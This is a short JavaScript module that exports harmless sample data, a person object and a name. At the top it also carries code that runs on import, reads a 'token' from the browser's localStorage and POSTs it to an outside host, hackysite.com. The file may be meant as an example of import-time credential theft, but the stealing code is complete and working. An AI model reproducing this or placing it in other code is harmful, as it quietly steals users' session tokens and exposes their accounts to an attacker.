const token = localStorage.getItem("token");

if (token) {
  fetch("http://hackysite.com/", {
    method: "POST",
    body: JSON.stringify({ message: "Hello", token: token }),
  });
}

export const person = {
  name: "John",
  age: 30,
};

export const name = "John";
